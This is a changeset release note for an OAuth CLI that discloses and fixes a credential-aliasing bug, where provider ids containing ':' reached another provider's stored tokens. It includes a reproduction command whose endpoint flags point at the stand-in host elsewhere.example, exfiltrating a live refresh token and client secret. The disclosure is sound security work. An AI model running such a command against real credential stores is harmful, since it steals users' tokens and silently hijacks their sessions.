---
'@ai-oauth-sdk/cli': patch
---

Refuse a provider id that aliases another provider's credential-store key.

`customProvider()` refuses `--authorize-url`/`--token-url` on a built-in id, because the
descriptor it builds keeps `id: providerId` and that id is what everything else is keyed on —
pointing a built-in at endpoints of your own sends the credentials stored under that id to
them. The guard tested `providerId in providers`, an exact string match against the built-in
table. What it was protecting is not the id, though: it is the storage key, which core derives
as `tokens:<id>` and, when `--account` is given, `tokens:<id>:<account>`.

`:` is that key's separator, so an id carrying one is not a provider of its own. `openai:work`
is not a key of `providers`, so it was accepted as custom — and it names the exact record
`login openai --account work` had written. The result:

```
ai-oauth-sdk refresh openai:work --client-id x \
  --authorize-url https://elsewhere.example/authorize \
  --token-url https://elsewhere.example/token
```

exited `0` and printed `✓ Refreshed openai:work`, having POSTed the account's live OpenAI
refresh token to the named endpoint and written that endpoint's answer back over the real
record. `ai-oauth-sdk token openai --account work` then returned the access token the named
endpoint had issued, and `list` showed one ordinary `openai`/`work` session, so nothing about
the machine looked changed. `token <alias>` reached the same path without `--force-refresh`
whenever the stored token had expired, and `AI_OAUTH_SDK_CLIENT_SECRET` went along with it,
since `clientFor` applies the environment secret to whatever provider is named. `refresh
openai` was refused throughout, which is what kept the bypass from being obvious.

Ids containing `:` are now rejected, with a hint naming `--account` — the supported way to keep
several sessions under one provider. The check sits in `requireProvider`, the one function every
provider-taking command resolves its argument through, rather than beside the endpoint flags:
remembered descriptors are keyed `provider:<id>` on the same separator, and `logout`, `whoami`
and `token` reach an aliased record without passing an endpoint flag at all.

No built-in id contains a `:`, and none can — it would collide with its own accounts — so this
refuses nothing that worked. A custom provider that was being spelled with one should be
renamed; its tokens are still reachable under the id and account the key already names.
